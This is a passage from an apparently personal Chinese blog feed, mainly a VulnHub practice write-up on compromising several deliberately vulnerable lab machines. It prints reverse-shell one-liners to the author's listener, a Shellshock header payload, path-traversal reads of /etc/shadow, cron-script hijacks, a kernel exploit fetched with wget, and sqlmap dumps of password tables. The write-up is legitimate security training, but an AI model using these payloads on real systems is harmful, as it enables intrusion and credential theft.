class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">s, ok := big.NewInt(<span class="number">0</span>).SetString(signatureHex[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signature, err := asn1.Marshal(<span class="keyword">struct</span>&#123; R, S *big.Int &#125;&#123;r, s&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, errors.New(<span class="string">&quot;签名值格式有误&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isValid := publicKey.Verify(msg, signature)</span><br><span class="line"><span class="keyword">if</span> isValid &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, fmt.Errorf(<span class="string">&quot;签名无效&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下半场直接摆烂睡觉了，本来是准备刷一下<strong>渗透靶机</strong>的，发现<strong>解压密码</strong>在微信聊天记录里面。。。。。</p><p>断网啊，哥们，我玩牛魔……</p><p>玩！</p><p><img src="https://pic1.zhimg.com/80/v2-710631aedf0c58eeaa7b2a39dc32a476_1440w.jpeg" alt=""><br><img src="https://pica.zhimg.com/80/v2-5801c0b799379099e611b0c67ab82a82_1440w.jpeg" alt=""><br><img src="https://picx.zhimg.com/80/v2-3d1106abce12b0a535eef9715fafc69d_1440w.jpeg" alt=""><br><img src="https://picx.zhimg.com/80/v2-f54fc52f21112d13bf90e2711faa78d0_1440w.jpeg" alt=""><br><img src="https://picx.zhimg.com/80/v2-d7b80113ecfd9a518e75b475c7bf7137_1440w.jpeg" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很好，属于是来&lt;strong&gt;重庆旅&lt;/strong&gt;游来了，先爆一下战绩，初始谜题做了一个，差点爆零(bushi)&lt;/p&gt;
&lt;p&gt;去年还能做两个初始谜题，后面的夺旗闯关还能有点思路，就是不会写而已&lt;/p&gt;
&lt;p&gt;今年的夺旗闯关就真不会了，看得懂一点，但具体不知道要干嘛，&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub打靶记录</title>
    <link href="https://hvang10.github.io/2025/06/06/vulnhub%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/06/06/vulnhub%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</id>
    <published>2025-06-05T17:39:43.000Z</published>
    <updated>2025-08-05T17:48:07.498Z</updated>
    
    <content type="html"><![CDATA[<p>此文诞生于本人实习期间，属于是<strong>摸鱼成果</strong>，虽然但是也没打几个靶场，毕竟哪有这么爽的鱼可以摸</p><p>只能说<code>vulnhub</code>这边的靶场比较偏向教育性质，适合新手，可能进阶的那些我还没接触()</p><p>在某次训练营中，被主办方设计的比较贴近实际的仿真靶场给虐到了，后续应该会投向与<strong>HTB</strong>等靶场平台继续学习了……</p><h1 id="nmap命令参数介绍"><a href="#nmap命令参数介绍" class="headerlink" title="nmap命令参数介绍"></a>nmap命令参数介绍</h1><p>待补充</p><h1 id="SickOS1-1"><a href="#SickOS1-1" class="headerlink" title="SickOS1.1"></a>SickOS1.1</h1><p><code>网络适配器</code>设置成<code>NAT模式</code><br>这里靶机需要登陆<br><img src="https://picx.zhimg.com/80/v2-21c08ac76a33163198a021514062757c_1440w.png" alt=""></p><h2 id="主机发现和端口扫描"><a href="#主机发现和端口扫描" class="headerlink" title="主机发现和端口扫描"></a>主机发现和端口扫描</h2><p><code>ip a</code>获取<code>kali本机</code>的<code>ip</code>，然后扫描该网段的主机存活信息<br><code>nmap -sn 192.168.32.0/24</code><br>靶机上线前后各扫一次就可以找到靶机<code>ip</code>了<br>最小速率<code>10000</code>扫描，<code>-p-</code>扫描<strong>全部端口</strong><br><code>nmap --min-rate 10000 -p- 192.168.32.129</code><br><img src="https://pic1.zhimg.com/80/v2-82d47efe9e72e894d16067edb8ac4171_1440w.png" alt=""><br>发现22端口的<code>ssh服务</code>开放，3128端口的<code>squid-http服务</code>开放，8080端口的<code>http服务</code>关闭<br><code>tcp</code>再扫一下这三个端口，<code>-sT</code>用TCP扫描，<code>-sV</code>查看服务版本，<code>-O</code>查看操作系统版本，<code>-p</code>后面添加端口号<br><img src="https://pica.zhimg.com/80/v2-7f9f07fd0dc6498906a9cff77ca3508a_1440w.png" alt=""></p><p><code>UDP</code>再扫一次，确保不会漏掉攻击面<br><code>nmap -sU -p22,3128,8080 192.168.32.129</code><br><img src="https://picx.zhimg.com/80/v2-8afcd761d67cfbf54242e06960b1a311_1440w.png" alt=""><br>还是没有关键信息</p><p>再用<code>nmap</code>自带的漏洞扫描脚本扫一下<br><code>nmap --script=vuln -p22,3128,8080 192.168.32.129</code><br>一样没有关键信息</p><p>目前得到的信息是，无法访问的8080的端口<code>web服务</code>，3128端口的<code>http代理服务</code>，22端口的<code>ssh服务</code>这边暂时不知道用户名密码也无法入手</p><p>也不知道<code>squid</code>是个什么玩意，访问对应端口，然后搜<code>squid/3.1.19</code>，只知道是一个比较老的开源代理服务器，还涉及到几个<code>CVE</code></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><code>dirb http://192.168.32.129 -p http://192.168.32.129:3128</code><br><img src="https://picx.zhimg.com/80/v2-f4223785ce4f09a6f4ff5def3ad49535_1440w.png" alt=""></p><h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>同样需要设置代理才能访问靶机(可以直接搜<code>proxy</code>)<br><img src="https://picx.zhimg.com/80/v2-01c5ab3134851be70aeac2b4f163fba9_1440w.png" alt=""><br><code>robots.txt</code>告诉我们可以访问一下<code>/wolfcms</code><br>这是一个<code>cms内容管理系统</code>，并且发现文章是<strong>管理员</strong>上传的，找一下<code>admin</code>登陆路径</p><p><code>/wolfcms/?/admin/login</code>，弱口令<code>admin/admin</code>进去了<br><img src="https://picx.zhimg.com/80/v2-e2a9ffcf2bd7b28a66f28b3458da0627_1440w.png" alt=""></p><h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p>发现很多<code>php</code>代码文件并且可以直接修改，直接塞一句<code>反弹shell</code>进去<code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1&#39;&quot;); ?&gt;</code><br>然后保存访问一下，靶机就可以连上我们主机了<br><code>kali</code>开监听<code>2333端口</code></p><p><img src="https://pic1.zhimg.com/80/v2-76a4d4e13c1081d3f78a86f48f9e161f_1440w.png" alt=""><br>这里拿到的是<code>mysql</code>的账密，看一下<code>/etc/passwd</code><br>发现账户有<code>root sickos www-data</code>，并且<code>root sickos</code>都有<code>/bin/bash</code>的环境，<code>sickos</code>可能是一个高权限用户，尝试了<code>ssh</code>登陆</p><p>发现<code>sickos/john@123</code>可以登陆，知道密码我们可以直接提权<code>sudo su</code></p><h2 id="nikto扫描"><a href="#nikto扫描" class="headerlink" title="nikto扫描"></a>nikto扫描</h2><p>思路二：</p><p>既然涉及到网页服务，也可以拿<code>nikto</code>扫一下<br><code>nikto</code>是一个开源的网页服务器扫描器，坏处就是它不经常更新</p><p>这里还是要走一下代理<br><code>nikto -h 192.168.32.129 -useproxy http://192.168.32.129:3128</code><br>发现在<code>/cgi-bin/status</code>目录下存在<code>ShellShock</code>漏洞<br><img src="https://picx.zhimg.com/80/v2-e2f1b88e8ac8388804e26b0cf310850f_1440w.png" alt=""><br><code>Shellshock</code>，又称<code>Bashdoor</code>，是在<code>Unix</code>中广泛使用的<code>Bash shell</code>中的一个安全漏洞，首次于2014年9月24日公开。许多互联网守护进程，如网页服务器，使用<code>bash</code>来处理某些命令，从而允许攻击者在易受攻击的<code>Bash</code>版本上执行任意代码。这可使攻击者在未授权的情况下访问计算机系统</p><h2 id="shellshock漏洞利用"><a href="#shellshock漏洞利用" class="headerlink" title="shellshock漏洞利用"></a>shellshock漏洞利用</h2><p>这里可以通过构造恶意的<code>Referer头</code>来执行任意命令</p><p><code>curl -v --proxy http://192.168.32.129:3128 http://192.168.32.129/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; echo &#39;Content-Type: text/plain&#39;; echo; echo; /usr/bin/id;exit&quot;</code><br>发现成功执行了</p><p>可以<code>反弹shell</code>看看有没有可利用的信息</p><p>生成<code>bash反弹shell</code>命令<br><code>msfvenom -p cmd/unix/reverse_bash lhost=192.168.32.128 lport=2333 -f raw</code></p><p><code>curl -v --proxy http://192.168.32.129:3128 http://192.168.32.129/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; 0&lt;&amp;113-;exec 113&lt;&gt;/dev/tcp/192.168.32.128/2333;/bin/sh &lt;&amp;113 &gt;&amp;113 2&gt;&amp;113&quot;</code></p><p><code>kali</code>开监听<code>nc lvnp 2333</code></p><p>发现交互很难看，通过<code>包管理器</code>看看有没有<code>Python</code>之类方便的<code>交互shell</code><br><code>dpkg -l</code></p><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p>查看网页的根目录<code>cd /var/www</code><br>查看权限<code>ls -al</code><br>发现<code>connect.py</code>居然给到了<code>777</code>，即<strong>所有用户</strong>都<strong>可读可写可执行</strong><br>这里可以根据内容猜测它存在<strong>定时任务</strong></p><h2 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h2><p><code>cd /etc</code><br><code>ls -al | grep &quot;cron&quot;</code><br><code>cd cron.d</code><br><code>cat automate</code><br>发现它是以<code>root权限</code>每分钟执行<code>connect.py</code>这个文件，这样就可以通过写<code>Python的反弹shell命令</code>到<code>connect.py</code>这个文件，就可以成功<code>root</code>了</p><p><code>msfvenom -p cmd/unix/reverse_python lhost=192.168.32.128 lport=2333 -f raw</code></p><p>然后<code>kali</code>开监听，等一分钟左右即可</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>账密默认配置</strong>可能是个突破口，但现在的环境基本无法利用；<strong>定时任务</strong>也是一个很有用的<strong>提权</strong>思路</p><h1 id="W1R3S1-01"><a href="#W1R3S1-01" class="headerlink" title="W1R3S1.01"></a>W1R3S1.01</h1><h2 id="主机发现和端口扫描-1"><a href="#主机发现和端口扫描-1" class="headerlink" title="主机发现和端口扫描"></a>主机发现和端口扫描</h2><p>是一个<code>ubuntu16</code>的靶机，同样需要密码登陆</p><p><code>nmap -sn 192.168.32.0/24</code><br>发现主机<code>192.168.32.130</code><br><code>nmap --min-rate 10000 -p- 192.168.32.130</code><br>发现21端口<code>ftp文件传输服务</code>，22端口<code>ssh服务</code>，80端口<code>http服务</code>，3306端口<code>mysql服务</code><br><img src="https://picx.zhimg.com/80/v2-51ee067e4460f2642cb867c77575205c_1440w.png" alt=""><br>发现了<code>wordpress</code>登陆网页</p><p><code>ftp服务</code>没有什么可以利用的信息，可以通过<code>get</code>下载文件</p><p><code>wordpress</code>登陆页面的操作都是在跳转<code>localhost</code>，不能进行爆密码操作。。。</p><h2 id="目录扫描-1"><a href="#目录扫描-1" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>换<code>dirsearch</code>扫一下，<code>kali</code>的<code>dirb</code>没有高亮，不习惯，<code>python ./dirsearch.py -u 192.168.32.130</code></p><p><code>http://192.168.32.130/administrator/installation/</code>得知这是一个<code>Cuppa CMS</code>，这里的操作页面是没有什么用的，找一下<code>CMS</code>的漏洞</p><h2 id="web渗透-1"><a href="#web渗透-1" class="headerlink" title="web渗透"></a>web渗透</h2><p><code>searchsploit cuppa</code>，告诉我们<code>/alertConfigField.php</code>存在<strong>本地/远程文件包含</strong><br>获取说明<code>searchsploit cuppa -m 25971.txt</code></p><p>这里需要修改一下路径<code>http://192.168.32.130/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</code></p><p>但页面并没有回显，换成<code>POST请求</code>或者<code>curl</code><br><code>curl -X POST -d &quot;urlConfig=../../../../../../../../../etc/passwd&quot; http://192.168.32.130/administrator/alerts/alertConfigField.php</code><br>读一下影子文件<code>/etc/shadow</code>，因为<code>passwd</code>里面的密码只能显示<code>x</code><br>拿到<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br></pre></td></tr></table></figure><br>这里就拿到了三个用户的密码哈希</p><h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>拿<strong>john</strong>爆一下<br><img src="https://picx.zhimg.com/80/v2-6bfd16e3f6ad3646ca21319b27dbf523_1440w.png" alt=""><br>有密码就直接提权了</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>本靶机找到<code>cuppa</code>的漏洞即可，要注意这些不怎么明显的信息</p><h1 id="jarbas"><a href="#jarbas" class="headerlink" title="jarbas"></a>jarbas</h1><h2 id="主机发现与端口扫描"><a href="#主机发现与端口扫描" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p>这是个<code>centos7</code>的靶机<br><code>nmap -sn 192.168.32.0/24</code><br>发现主机<code>192.168.32.131</code><br><code>nmap --min-rate 10000 -p- 102.168.32.131</code><br>发现开放了<code>22 80 3306</code><br><code>TCP UDP</code>扫，<code>nmap</code>自带脚本扫，没有得到有用信息</p><h2 id="目录扫描-2"><a href="#目录扫描-2" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><code>dirb http://192.168.32.131</code>，诶，没扫到东西出来，指定后缀<br><code>dirb http://192.168.32.131 -X .php,.html</code>，扫出一个<code>access.html</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiago:5978a63b4654c73c60fa24f836386d87</span><br><span class="line">trindade:f463f63616cb3f1e81ce46b39f882fd5</span><br><span class="line">eder:9b38e2b1e8b12f426b0d208a7ab6cb98</span><br></pre></td></tr></table></figure><br><a href="https://hashes.com/en/decrypt/hash">多行哈希解密</a><br><code>italia99 vipsu marianna</code></p><h2 id="web渗透-2"><a href="#web渗透-2" class="headerlink" title="web渗透"></a>web渗透</h2><p>重启了靶机才扫出<code>8080端口</code>，我就说登陆界面怎么不见了。。。<br>账密对不上，得试试排列组合<code>eder vipsu</code><br>登进去后，随便点击创建项目，居然发现了这个<br><img src="https://picx.zhimg.com/80/v2-ac6ce63ef84ebf1e3083feeca7f59d12_1440w.png" alt=""><br><code>bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1</code>写入保存然后点击立即构建，本地开监听<br><code>whoami</code>得知当前用户为<code>jenkins</code>，读<code>/etc/passwd</code>只有<code>root ede</code>r有<code>/bin/bash</code>环境，但读取不到<code>/etc/shadow</code><br>接下来继续找找有没有<strong>定时任务</strong>可以利用</p><h2 id="定时任务提权-1"><a href="#定时任务提权-1" class="headerlink" title="定时任务提权"></a>定时任务提权</h2><p>查看系统定时任务<code>cat /etc/crontab</code><br><img src="https://picx.zhimg.com/80/v2-e75274d832efe214ad63a2888cfe88f9_1440w.png" alt=""><br>发现<strong>root权限</strong>运行的定时任务，该<code>sh脚本</code>是用来删日志文件的<br>看一下权限是<strong>777</strong>，那我们直接追加写入<code>反弹shell</code>语句就好了<br><code>echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.32.128/233 0&gt;&amp;1&#39; &gt;&gt; /etc/script/CleaningScript.sh</code><br><code>kali</code>监听<code>233端口</code><br>这里是<strong>五分钟</strong>执行一次定时任务，等一等就好了</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>还是<strong>定时任务提权</strong>，主要原因是因为该执行脚本权限给的太高了</p><h1 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h1><p>哦豁，这是一台用于<code>OSCP考试</code>的靶机</p><h2 id="主机发现与端口扫描-1"><a href="#主机发现与端口扫描-1" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p><code>nmap -sn 192.168.32.0/24</code><br><code>nmap --min-rate 10000 -p- 192.168.32.132</code><br>这次只发现了22和80端口<br><code>TCP UDP</code>自带的<code>vuln扫描脚本</code>扫一遍都没发现什么东西，知道了是<code>wordpress cms</code></p><h2 id="目录扫描-3"><a href="#目录扫描-3" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><code>dirb http://192.168.32.132</code><br>扫出了<code>/dev</code> <code>/wordpress/wp-admin</code>等一堆路径，依然是需要登陆，但<code>/dev</code>告诉了我们要深挖，因此先不要爆破密码了(试了一手弱口令没成功)</p><p>继续扫<br><code>dirb http://192.168.32.132 -X .zip,.txt,.php</code><br><code>/image.php</code> <code>/index.php</code> <code>/secret.txt</code></p><p><code>/secret.txt</code>告诉我们需要在<code>php</code>页面上做更多<code>fuzz</code>，找到<strong>正确的参数</strong>，还给了工具链接<code>wfuzz</code>，<code>kali</code>自带有，并且给了下一步的提示<code>location.txt</code></p><h2 id="web渗透-3"><a href="#web渗透-3" class="headerlink" title="web渗透"></a>web渗透</h2><p><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 ``http://192.168.32.132/index.php?FUZZ=</code></p><p>得到<code>file</code>参数，结合提示访问<code>/index.php?file=location.txt</code><br>给了<code>/image.php</code>页面的参数<code>secrettier360</code></p><p>发现能<strong>任意文件读取</strong>而且读不到的<strong>不会返回任何信息</strong></p><p>找到三个有<code>/bin/bash</code>环境的用户<code>root victor guest-w3z5e1</code></p><p><code>shadow</code>文件读不到<br>还放了一句<code>saket:x:1001:1001:find password.txt file in my directory:/home/saket:</code></p><p>读<code>/home/saket/password.txt</code>得到<code>follow_the_ippsec</code><br><code>ssh</code>试过一遍，不对，那就登陆<code>wordpress</code>，发现也不是</p><p>再访问<code>/wordpress</code>看看，发现博客作者是<code>victor</code>，试一下是不是他的密码<br><code>/wordpress/wp-login.php</code><br>成功进入后台</p><p>找到一个留给我们的可以执行<code>php代码</code>的文件<code>http://192.168.32.132/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen</code></p><p>其他位置都<strong>不可写</strong><br>写入<code>shell</code><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>保存后需要访问该文件的路径才能建立连接</p><p>小查一手<br><code>http://192.168.32.132/wordpress/wp-content/themes/twentynineteen/secret.php</code></p><p>查看当前权限<code>sudo -l</code></p><p><code>/home/saket/enc</code>发现无权限<br>定时任务这边，在<code>/root/t.sh</code>这样就没有办法下手了</p><h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><p><code>uname -a</code>看到<code>Linux</code>版本很低<code>Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu</code></p><p><code>searchsploit Linux ubuntu 4.10.0-28</code><br><img src="https://picx.zhimg.com/80/v2-e9c08ae405ec638d38b3ba00478c4043_1440w.png" alt=""><br>这里有一个<strong>提权漏洞</strong><br><code>searchsploit -m 45010.c</code></p><p>查看使用方法，发现需要<code>gcc编译</code>，那么我们让靶机<code>wget</code>下载下来即可<br><code>kali</code>开<code>web服务</code>，<code>php -S 0:80</code></p><p>靶机在<code>/tmp</code>目录下(这里有权限)执行，<code>wget http://192.168.32.128/45010.c</code><br><code>gcc</code>编译，<code>gcc 45010.c -o getshell</code>，执行然后提权<code>./getshell</code></p><p><code>dpkg -l | grep &quot;python&quot;</code><br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><br><code>cat /root/root.txt</code></p><h2 id="OpenSSL解密"><a href="#OpenSSL解密" class="headerlink" title="OpenSSL解密"></a>OpenSSL解密</h2><p>思路二：</p><p>这里从拿到<code>www-data</code>权限开始，<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code> <code>sudo -l</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User www-data may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /home/saket/enc</span><br></pre></td></tr></table></figure><br>说明当前用户能够以无密码<code>root</code>权限运行<code>enc</code>，但是还是需要密码，找找看<br>而且密码这种东西可能存在<strong>备份</strong>，<code>find / -name &quot;*backup*&quot; 2&gt;dev/null</code></p><p><code>/var/backups</code>的<code>passwd.bak</code> <code>shadow.bak</code>没有权限</p><p><code>cat /opt/backup/server_database/backup_pass</code>得到<code>backup_password</code></p><p><code>./enc</code>告诉我good。。。<br>但是多了两个东西<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/cp: cannot stat &#x27;/root/enc.txt&#x27;: Permission denied</span><br><span class="line">/bin/cp: cannot stat &#x27;/root/key.txt&#x27;: Permission denied</span><br></pre></td></tr></table></figure><br>奥，命令不对<br><code>sudo ./enc</code><br>但是这也让我提前注意到了这两个文件，就在<code>/home/saket</code>目录下面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I know you are the fan of ippsec.</span><br><span class="line"></span><br><span class="line">So convert string &quot;ippsec&quot; into md5 hash and use it to gain yourself in your real form.</span><br></pre></td></tr></table></figure><p>将<code>ippsec</code>进行<code>MD5加密</code>并以<code>16进制</code>输出<br><code>echo -n &#39;ippsec&#39; | md5sum | awk -F &#39; &#39; &#39;&#123;print $1;&#125;&#39; | tr -d &#39;\n&#39; | od -A n -t x1| tr -d &#39;\n&#39; | tr -d &#39; &#39;</code></p><p><code>openssl -h</code>，把<code>enc</code>的算法写入到<code>CipherTypeRaw</code><br><code>vim CipherTypeRaw</code></p><p>换行分割解密算法，<code>awk &#39;&#123;gsub(&quot; &quot;,&quot;\n&quot;);print&#125;&#39; CipherTypeRaw | sort | uniq &gt; CipherTypes</code></p><p>解密算法遍历输出，<code>for cipher in $(cat CipherTypes); do echo &quot;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&quot; | openssl enc -d -a -$cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2&gt;/dev/null;echo $cipher;done</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dont worry saket one day we will reach to</span><br><span class="line">our destination very soon. And if you forget </span><br><span class="line">your username then use your old password</span><br><span class="line">==&gt; &quot;tribute_to_ippsec&quot;</span><br><span class="line"></span><br><span class="line">Victor,aes-256-ecb</span><br></pre></td></tr></table></figure><p>得到<code>saket/tribute_to_ippsec</code>，<code>ssh saket@192.168.32.132</code> <code>sudo -l</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User saket may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /home/victor/undefeated_victor</span><br></pre></td></tr></table></figure></p><p><code>sudo /bin/bash</code>得到<br><code>Sorry, user saket is not allowed to execute &#39;/bin/bash&#39; as root on ubuntu.</code></p><p>尝试<code>sudo /home/victor/undefeated_victor</code>，得到<code>if you can defeat me then challenge me in front of you/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found</code></p><p>给<code>/tmp/challenge</code>赋予<code>/bin/bash</code>的可执行环境，即可<code>root</code>权限执行，成功<code>root</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;#!/bin/bash&#x27; &gt; /tmp/challenge</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt; /tmp/challenge</span><br><span class="line">chmod +x /tmp/challenge</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure></p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>感觉低版本内核漏洞还是太少见了，不过<code>OpenSSL</code>解密也是一种新奇的思路</p><h1 id="LAMPSecurity-CTF4"><a href="#LAMPSecurity-CTF4" class="headerlink" title="LAMPSecurity: CTF4"></a>LAMPSecurity: CTF4</h1><h2 id="主机发现与端口扫描-2"><a href="#主机发现与端口扫描-2" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p><code>192.168.32.133</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE  SERVICE</span><br><span class="line">22/tcp  open   ssh</span><br><span class="line">25/tcp  open   smtp</span><br><span class="line">80/tcp  open   http</span><br><span class="line">631/tcp closed ipp</span><br></pre></td></tr></table></figure><br><code>TCP UDP</code>扫都没什么东西<br><code>nmap</code>自带漏洞脚本，扫出了<code>CSRF、SQL</code>注入漏洞</p><h2 id="web渗透-4"><a href="#web渗透-4" class="headerlink" title="web渗透"></a>web渗透</h2><p>看了一些登陆页面和<code>/robots.txt</code>的路径，小爆了账密一下，没有用，<code>/mail</code>，<code>SquirreMail1.4.17</code>，存在<strong>远程代码执行漏洞</strong>，但找不到有用的相关参考，然后博客文章，试了一下，发现用的是<code>mysql</code><br><code>http://192.168.32.133/index.html?page=blog&amp;title=Blog&amp;id=5</code></p><p><code>sqlmap</code>直接<strong>爆数据库</strong><br><code>sqlmap -u &#39;http://192.168.32.133/index.html?page=blog&amp;title=Blog&amp;id=5&#39; --dbs --dump --batch</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ehks                                                                                                 </span><br><span class="line">Table: user</span><br><span class="line">[6 entries]</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| user_id | user_name | user_pass                                        |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |</span><br><span class="line">| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |</span><br><span class="line">| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |</span><br><span class="line">| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |</span><br><span class="line">| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |</span><br><span class="line">| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure><br>尝试<code>ssh</code>登陆，<code>Kali</code>这边有问题，<code>windows</code>这边成功了<br><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss dstevens@192.168.32.133 -o macs=hmac-sha1-96</code></p><p>有密码，<code>sudo su</code>或者<code>sudo /bin/bash</code>，新启动一个新的<code>bash</code>线程命令，成功<code>root</code>，后续发现只有数据库里面的前两个用户可以<code>root</code></p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>成脚本小子了()</p><h1 id="LAMPSecurity-CTF5"><a href="#LAMPSecurity-CTF5" class="headerlink" title="LAMPSecurity: CTF5"></a>LAMPSecurity: CTF5</h1><h2 id="主机发现与端口扫描-3"><a href="#主机发现与端口扫描-3" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p><code>192.168.32.134</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">80/tcp    open  http</span><br><span 